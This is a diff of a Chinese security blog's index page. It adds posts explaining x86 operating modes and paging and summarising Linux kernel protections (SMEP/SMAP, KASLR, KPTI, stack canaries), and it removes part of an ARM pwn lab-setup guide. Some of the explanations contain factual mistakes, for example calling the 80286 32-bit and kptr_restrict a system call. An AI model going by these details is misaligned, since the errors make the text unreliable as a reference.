@@ -156,6 +156,430 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/" class="post-title-link" itemprop="url">x86-32&64处理器的几种运行模式</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-09-17 22:43:29" itemprop="dateCreated datePublished" datetime="2022-09-17T22:43:29+08:00">2022-09-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-10-02 21:51:05" itemprop="dateModified" datetime="2022-10-02T21:51:05+08:00">2022-10-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>3.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="x86-32"><a href="#x86-32" class="headerlink" title="x86-32"></a>x86-32</h2><p>在32位时代，x86 的 operating mode 有3种：</p>
+<ul>
+<li>实模式（Real Mode）</li>
+<li>保护模式（Protected Mode）</li>
+<li>虚拟8086模式（Virtual 8086 Mode） </li>
+</ul>
+<p><strong>实模式（Real Mode）</strong></p>
+<p>8086的CPU是16位的，为其可以索引更大的内存地址空间，内核采用了分段机制（shift-and-add segmentation）</p>
+<ul>
+<li>即一个逻辑地址由 segment 加上 offset 组成</li>
+</ul>
+<p>基于分段机制（shift-and-add segmentation）的寻址过程：</p>
+<ul>
+<li>获取对应的段寄存器</li>
+<li>通过公式 <code>linear address = segment &lt;&lt; 4 + offset</code> 计算逻辑地址</li>
+</ul>
+<p><strong>保护模式（Protected Mode）</strong></p>
+<p>80286 的CPU是32位的（寻址范围为4G），它也使用分段机制（table-based segmentation）</p>
+<ul>
+<li>但它的段寄存器 segment register 存的不再是 segment 的起始地址，而是一个段选择子 segment selector</li>
+<li>通过这个 segment selector 查找全局标识符表GDT表获得段描述符 segment descriptor</li>
+<li>segment descriptor 存的才是 segment 的起始地址 </li>
+</ul>
+<p>段寄存器 segment register 中存放的就是16位的数据结构-段选择子</p>
+<p>段选择子 segment selector 的结构如下：</p>
+<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663378590133-1664718664746.png" class width="1663378590133"> 
+<ul>
+<li>Index：CPU 将索引号乘8再加上GDT或者LDT的基地址，就可以找到目标段描述符</li>
+<li>TL：其值为“0”查找 GDT 表，其值为“1”查找 LDT 表</li>
+<li>RPL：请求特权级别（可以用于判断当前代码是否处于内核态）</li>
+</ul>
+<p>在保护模式下，对一个段的描述则包括3方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个64-bit长的数据结构中，被称为段描述符</p>
+<p>段描述符 segment descriptor 的结构如下：</p>
+<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663377315062-1664718664747.png" class width="1663377315062"> 
+<ul>
+<li><strong>G</strong> - Granularity 粒度（byte 或者 page），因为段的最大长度 limit 占20位<ul>
+<li>如果粒度为 byte，则该 segment 的寻址范围是 1MB</li>
+<li>如果粒度为 page-4KB，则该 segment 的寻址范围是 4GB</li>
+<li>一个 segment 的 size 是由 limit 和G位共同确定的</li>
+</ul>
+</li>
+<li><strong>D/B</strong> - Default Size/Bound<ul>
+<li>为“1”表示在32位模式下运行</li>
+<li>为“0”在16位模式下运行</li>
+</ul>
+</li>
+<li><strong>L</strong> - 仅在64位系统中有效<ul>
+<li>为“1”表示在64位长模式下运行（64-Bit Mode）</li>
+<li>为“0”表示在64位兼容模式下运行（Compatibility Mode）</li>
+</ul>
+</li>
+<li><strong>AVL</strong> - Available for software，留给软件用的，但在 linux 里是被忽略的</li>
+<li><strong>P</strong> - Present，用于指明表项对地址转换是否有效<ul>
+<li>P = 1：表示有效</li>
+<li>P = 0：表示无效</li>
+<li>在页转换过程中，如果说涉及的页目录或页表的表项无效，则会导致一个异常</li>
+</ul>
+</li>
+<li><strong>DPL</strong> - Descriptor Privledge Level，表示可以访问 segment 的最低级别<ul>
+<li>x86处理器的特权级别从 <code>ring 0</code> 到 <code>ring 3</code>，数字越小，级别越高</li>
+<li>通常用户空间运行于 <code>ring3</code>，内核空间运行于 <code>ring0</code></li>
+<li>假设 DPL 为“1”，则只有当前特权级别为“0”或者“1”时，才可以访问该 decriptor 指向的 segment</li>
+</ul>
+</li>
+<li><strong>Type</strong> - 目标段拥有的权限<ul>
+<li>对于 task segment 是没有意义的</li>
+<li>对于 code segment 和 data segment 主要是关于 Writable，Executable 的属性</li>
+</ul>
+</li>
+<li><strong>Base Address</strong> - 基地址</li>
+</ul>
+<p>基于分段机制（table-based segmentation）的寻址过程：</p>
+<ul>
+<li>内核提供了一个寄存器GDTR用来存放GDT的入口地址</li>
+<li>通过段选择子 segment selector 找到对应 GDT 条目-段描述符 segment descriptor</li>
+<li>通过段描述符 segment descriptor 找到基地址</li>
+</ul>
+<p>GDT&amp;LDT 的使用条件：</p>
+<ul>
+<li>GDT 能完成被多个任务共享的内存区</li>
+<li>LDT 通常情况下是与任务的数量保持对等（LDT放在GDT中）</li>
+</ul>
+<p><strong>虚拟8086模式（Virtual 8086 Mode） </strong></p>
+<p>利用一种硬件虚拟化技术，在i386的芯片上模拟出多个8086芯片</p>
+<p>当处理器进入保护模式后，基于实模式的应用就不能直接运行了，采用虚拟8086模式，则可以让这些实模式的应用运行在基于保护模式的操作系统上，因此这种模式也被称为 Virtual Real Mode</p>
+<h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><p>进入64位的x64处理器时代后（64位CPU的寻址已经不会受到限制，可以不使用分段机制），产生了一种新的运行模式，叫 Long Mode，传统的三种模式则被统称为传统模式（Legacy Mode）</p>
+<p>Long Mode 又分为2种子模式：</p>
+<ul>
+<li>64位长模式（64-Bit Mode）：应用程序必须也得是64位的 </li>
+<li>64位兼容模式（Compatibility Mode）：32位应用程序也可以运行</li>
+</ul>
+<p>置位 EFER 寄存器的 LME 位可以开启 Long Mode</p>
+<ul>
+<li>由于 Long Mode 要求 paging 必须开启，所以在进入 Long Mode 之前，还需要置位CR0寄存器的PG位</li>
+<li>置位 code segment 的L位可在 64-Bit Mode 和 Compatibility Mode 之间切换</li>
+</ul>
+<p><strong>四级分页机制</strong></p>
+<p>如果不开启分页机制，那么线性地址就等同于物理地址，这要求物理地址必须是连续的</p>
+<p>前面我们提到 Linux 内核仅使用了较少的分段机制，但是却对分页机制的依赖性很强，其使用一种适合32位和64位结构的通用分页模型，该模型使用四级分页机制：</p>
+<ul>
+<li>页全局目录（Page Global Directory）</li>
+<li>页上级目录（Page Upper Directory）</li>
+<li>页中间目录（Page Middle Directory）</li>
+<li>页表（Page Table）</li>
+</ul>
+<p>因此线性地址因此被分成五个部分，通过各个部分索引到对应的表，而每一部分的大小与具体的计算机体系结构有关</p>
+<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663424435610-1664718664747.png" class width="1663424435610"> 
+<p>相关结构类型：</p>
+<ul>
+<li>Linux 分别采用 <code>pgd_t pmd_t pud_t pte_t</code> 四种数据结构来表示页全局目录项、页上级目录项、页中间目录项和页表项（这四种数据结构本质上都是无符号长整型 unsigned long）</li>
+</ul>
+<p>PAGE - 页表 (Page Table)：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PAGE_SHIFT</td>
+<td>指定Offset字段的位数</td>
+</tr>
+<tr>
+<td>PAGE_SIZE</td>
+<td>页的大小</td>
+</tr>
+<tr>
+<td>PAGE_MASK</td>
+<td>用以屏蔽Offset字段的所有位</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>PMD - 页目录 (Page Middle Directory)：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PMD_SHIFT</td>
+<td>指定线性地址的Offset和Table字段的总位数，换句话说，是页中间目录项可以映射的区域大小的对数</td>
+</tr>
+<tr>
+<td>PMD_SIZE</td>
+<td>用于计算由页中间目录的一个单独表项所映射的区域大小，也就是一个页表的大小</td>
+</tr>
+<tr>
+<td>PMD_MASK</td>
+<td>用于屏蔽Offset字段与Table字段的所有位</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>PUD_SHIFT - 页上级目录 (Page Upper Directory)：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PUD_SHIFT</td>
+<td>确定页上级目录项能映射的区域大小的位数</td>
+</tr>
+<tr>
+<td>PUD_SIZE</td>
+<td>用于计算页全局目录中的一个单独表项所能映射的区域大小</td>
+</tr>
+<tr>
+<td>PUD_MASK</td>
+<td>用于屏蔽Offset字段，Table字段，Middle Air字段和Upper Air字段的所有位</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>PGDIR_SHIFT - 页全局目录 (Page Global Directory)：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>PGDIR_SHIFT</td>
+<td>确定页全局页目录项能映射的区域大小的位数</td>
+</tr>
+<tr>
+<td>PGDIR_SIZE</td>
+<td>用于计算页全局目录中一个单独表项所能映射区域的大小</td>
+</tr>
+<tr>
+<td>PGDIR_MASK</td>
+<td>用于屏蔽Offset, Table，Middle Air及Upper Air的所有位</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>基于分页机制（paging）的寻址过程：</p>
+<ul>
+<li>从CR3寄存器中读取页目录所在物理页面的基址（即所谓的页目录基址），从线性地址的第一部分获取页目录项的索引，两者相加得到页目录项的物理地址</li>
+<li>第一次读取内存得到 pgd_t 结构的目录项，从中取出物理页基址取出（具体位数与平台相关，如果是32系统，则为20位），即页上级页目录的物理基地址</li>
+<li>从线性地址的第二部分中取出页上级目录项的索引，与页上级目录基地址相加得到页上级目录项的物理地址</li>
+<li>第二次读取内存得到 pud_t 结构的目录项，从中取出页中间目录的物理基地址</li>
+<li>从线性地址的第三部分中取出页中间目录项的索引，与页中间目录基址相加得到页中间目录项的物理地址</li>
+<li>第三次读取内存得到 pmd_t 结构的目录项，从中取出页表的物理基地址</li>
+<li>从线性地址的第四部分中取出页表项的索引，与页表基址相加得到页表项的物理地址</li>
+<li>第四次读取内存得到 pte_t 结构的目录项，从中取出物理页的基地址</li>
+<li>从线性地址的第五部分中取出物理页内偏移量，与物理页基址相加得到最终的物理地址</li>
+<li>第五次读取内存得到最终要访问的数据</li>
+</ul>
+<img src="/2022/09/17/x86-32&64%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E5%87%A0%E7%A7%8D%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/1663425389920-1664718664747.png" class width="1663425389920"> 
+<ul>
+<li>程序的线性地址将作为各级页表索引</li>
+<li>因此内核会给用户程序提供一个抽象：虚拟地址</li>
+<li>虚拟地址到线性地址的转换则依靠分段机制</li>
+</ul>
+<p><strong>其他差异</strong></p>
+<p>在 Legay Mode 中，用户空间可通过 SYSENTER 指令进入内核空间，内核空间则通过 SYSEXIT 指令返回用户空间，在此过程中，由于发生了 segment 切换，所以需要进行 segmentation 的各种检测，比较影响效率</p>
+<p>在 Long Mode 中，伴随着 segmentation 的弱化和 flat momery model（平坦内存模型）的使用，SYSENTER/SYSEXIT 这2个指令不再被支持，取而代之的不需要 segmentation 检测的 SYSCALL 和 SYSRET 指令</p>
+<p>此外，Legacy Mode 还提供了一种叫 task-state segment (TSS) 的硬件机制，可以在发生 task switch 时，自动保存 task 的状态信息，可理解为硬件辅助的进程切换，由于主流操作系统很少用到这一机制，在 Long Mode 中已经不再支持 TSS</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/14/kernel%20protect/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/14/kernel%20protect/" class="post-title-link" itemprop="url">kernel protect</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-14 14:58:30 / Modified: 15:09:31" itemprop="dateCreated datePublished" datetime="2022-09-14T14:58:30+08:00">2022-09-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>941</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="SMEP-amp-SMAP"><a href="#SMEP-amp-SMAP" class="headerlink" title="SMEP &amp; SMAP"></a>SMEP &amp; SMAP</h2><p>SMEP（Supervisor Mode Execution Prevention，管理模式执行保护）：阻止内核执行用户态传递的代码</p>
+<p>SMAP（Supervisor Mode Access Prevention，管理模式访问保护）：禁止内核CPU访问用户空间的数据和执行用户空间的代码</p>
+<p>CR4 寄存器的第 20/21 位可以查看是否开启 SMEP/SMAP：</p>
+<img src="/2022/09/14/kernel%20protect/1663059789043.png" class width="1663059789043"> 
+<h2 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h2><p>KASLR（Kernel Address Space Layout Randomization，内核地址空间布局随机化）：其实就是针对内核的 ASLR</p>
+<p>与 ASLR 不同，KASLR 有几个问题：</p>
+<ul>
+<li>如果用户在暴力破解找 kernel 的位置，会直接导致机器 crash</li>
+<li>与电脑的休眠机制不兼容</li>
+<li>有很多其他的模块需要或者依赖于知道 kernel 的位置，这些都需要谨慎处理：<ul>
+<li>开启 <code>kptr_restrict</code> 系统调用防止内核地址泄露到用户空间（普通用户都无法读取内核符号地址）</li>
+<li>使用 <code>dmesg_restrict</code> 防止 <code>dmesg</code> 泄露内核地址（限制非特权用户使用 dmesg 查看内核日志缓冲区中的消息）</li>
+<li><code>/var/log/messages</code> 应该设置为只有 <code>root</code> 用户能访问（该文件中存放的就是系统的日志信息）</li>
+</ul>
+</li>
+</ul>
+<h2 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h2><p>KPTI（Kernel PageTable Isolation，内核页表隔离）：完全分离用户空间与内核空间页表来解决页表泄露</p>
+<ul>
+<li>如果没有 KPTI，每当执行用户空间代码时，Linux 会在其分页表中保留整个内核内存的映射，并保护其访问，这样做的优点是当应用程序向内核发送系统调用或收到中断时，内核页表始终存在，可以避免绝大多数上下文交换相关的开销（TLB 刷新、页表交换等）</li>
+<li>开启 KPTI 后，为了彻底防止用户程序获取内核数据，可以令内核地址空间和用户地址空间使用两组页表集</li>
+</ul>
+<h2 id="Stack-Protector"><a href="#Stack-Protector" class="headerlink" title="Stack Protector"></a>Stack Protector</h2><p>在内核中也是有 Stack Protector 的，编译内核时设置 CONFIG_CC_STACKPROTECTOR 选项即可 </p>
+<ul>
+<li>每个函数执行前先向栈帧顶部插入一个 canary 值以确保顺序的栈上溢在破坏到父函数栈帧前必须要先破坏 canary</li>
+<li>每个函数返回之前会检测当前栈帧中的 canary 是否被修改，若被修改则代表发生了溢出，就会替换该函数的返回值为 <code>__stack_chk_fail</code></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/12/Principles%EF%BC%9APipe%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1556,895 +1980,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">ARM pwn 环境搭建+基础入门</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-08-29 19:51:41" itemprop="dateCreated datePublished" datetime="2022-08-29T19:51:41+08:00">2022-08-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-08-30 11:39:42" itemprop="dateModified" datetime="2022-08-30T11:39:42+08:00">2022-08-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>11k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>10 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="ARM-架构简述"><a href="#ARM-架构简述" class="headerlink" title="ARM 架构简述"></a>ARM 架构简述</h2><p>ARM 架构，过去称作进阶精简指令集机器（Advanced RISC Machine，更早称作艾康精简指令集机器， Acorn RISC Machine），是一个精简指令集（RISC）处理器架构家族，其广泛地使用在许多嵌入式系统设计 </p>
-<p>ARM程序，指在ARM系统中正在执行的程序，而非保存在ROM中的bin文件</p>
-<p>ARM 和 x86 之间的更多区别是：</p>
-<ul>
-<li>在 ARM 中，大多数指令都可用于条件执行。</li>
-<li>英特尔 x86 和 x86-64 系列处理器使用小端格式</li>
-<li>ARM 架构在低版本是小端的，之后，ARM 处理器成为 <strong>BL端</strong>（有允许可切换字节序的设置，由程序状态寄存器 CPSR 的位9 (E位) 控制）</li>
-</ul>
-<p>一个ARM程序包含3部分：</p>
-<ul>
-<li>RO段（只读）：RO是程序中的指令和常量</li>
-<li>RW段（可读写）：RW是程序中已初始化的变量</li>
-<li>ZI段（可读写）：ZI是程序中未初始化的变量</li>
-</ul>
-<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>安装 qemu-user：（用于开启虚拟机）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386</span><br></pre></td></tr></table></figure>
-<p>安装交叉编译工具 aarch64-linux-gnu-gcc：（推荐）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
-<p>安装交叉编译工具链 arm-linux-gcc-4.3.3：（不推荐）</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fshare%2Finit%3Fsurl%3DbpEq2Mr">arm-linux-gcc-4.4.3.tar.gz</a></li>
-<li>百度云盘，密码：1gtt</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/local/arm_4.4.3</span><br><span class="line">sudo cp -r ./opt/FriendlyARM/toolschain/4.4.3/* /usr/local/arm_4.4.3</span><br><span class="line">gedit ~/.zshrc</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/arm_4.4.3/bin</span><br></pre></td></tr></table></figure>
-<p>安装 qemu 内核：（最好不要 <code>apt-get</code> 直接安装，因为没有 <code>qemu-system-aarch64</code>）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-6.2.0.tar.xz</span><br><span class="line">tar xvJf qemu-6.2.0.tar.xz</span><br><span class="line">cd qemu-6.2.0</span><br><span class="line">./configure --target-list=aarch64-softmmu</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-<p>获取 ubuntu-18.04-server-arm64.iso：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/releases/18.04.3/">http://old-releases.ubuntu.com/releases/18.04.3/</a> </li>
-</ul>
-<p>下载对应架构（aarch64）的 UEFI 固件：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://releases.linaro.org/components/kernel/uefi-linaro/16.02/release/qemu64/QEMU_EFI.fd</span><br></pre></td></tr></table></figure>
-<p>创建虚拟机硬盘：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create ubuntuimg.img 40G</span><br></pre></td></tr></table></figure>
-<p>创建虚拟机：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-aarch64 -m 2048 -cpu cortex-a57 -smp 2 -M virt -bios QEMU_EFI.fd -nographic -drive if=none,file=ubuntu-18.04-server-arm64.iso,id=cdrom,media=cdrom -device virtio-scsi-device -device scsi-cd,drive=cdrom -drive if=none,file=ubuntuimg.img,id=hd0 -device virtio-blk-device,drive=hd0</span><br></pre></td></tr></table></figure>
-<p>直接回车选择安装 Ubuntu Server：</p>
-<p><img src="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1661655283051.png" alt="1661655283051"> </p>
-<p>安装成功后，就可以通过如下命令开启 ARM 程序：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/aarch64-linux-gnu ./[pwn] -g 1234</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./[pwn] -g 1234</span><br></pre></td></tr></table></figure>
-<p>最后介绍一下调试方法：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch [pwn] </span><br><span class="line">set architecture [Arch-name] # aarch64 or arm</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
-<p>参考：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51760563/article/details/119935101">使用qemu搭建ARM64架构虚拟机</a> </li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38406667/article/details/107367971">Ubuntu下arm-linux-gdb的安装</a> </li>
-</ul>
-<h2 id="数据类型和寄存器"><a href="#数据类型和寄存器" class="headerlink" title="数据类型和寄存器"></a>数据类型和寄存器</h2><p>与高级语言类似，ARM 支持对不同数据类型的操作</p>
-<p>我们可以加载（或存储）的数据类型可以是有符号和无符号单词，半字或字节，这些数据类型的扩展名是：</p>
-<ul>
-<li>-h 或 -sh 表示半字</li>
-<li>-b 或 -sb 表示一字节</li>
-<li>没有扩展名表示一字</li>
-</ul>
-<p>有符号数据类型和无符号数据类型之间的区别在于：</p>
-<ul>
-<li>有符号数据类型 (+s) 可以同时包含正值和负值，因此范围较小</li>
-<li>无符号数据类型 (+0) 可以保存较大的正值（包括“零”），但不能保存负值，因此范围更广</li>
-</ul>
-<p>以下是如何将这些数据类型与加载和存储说明一起使用的一些示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr = Load Word</span><br><span class="line">ldrh = Load unsigned Half Word</span><br><span class="line">ldrsh = Load signed Half Word</span><br><span class="line">ldrb = Load unsigned Byte</span><br><span class="line">ldrsb = Load signed Bytes</span><br><span class="line"></span><br><span class="line">str = Store Word</span><br><span class="line">strh = Store unsigned Half Word</span><br><span class="line">strsh = Store signed Half Word</span><br><span class="line">strb = Store unsigned Byte</span><br><span class="line">strsb = Store signed Byte</span><br></pre></td></tr></table></figure>
-<p>寄存器的数量取决于ARM版本</p>
-<p>根据ARM参考手册，除了基于 <code>ARMv6-M</code> 和 <code>ARMv7-M</code> 的处理器外，都有30个通用的32位寄存器，其中的 <code>r0-r15</code> 作用如下表：</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>标号</th>
-<th>别名</th>
-<th style="text-align:left">目的</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>R0</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R1</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R2</td>
-<td>–</td>
-<td style="text-align:left">一般用途</td>
-</tr>
-<tr>
-<td>R3型</td>
-<td>–</td>
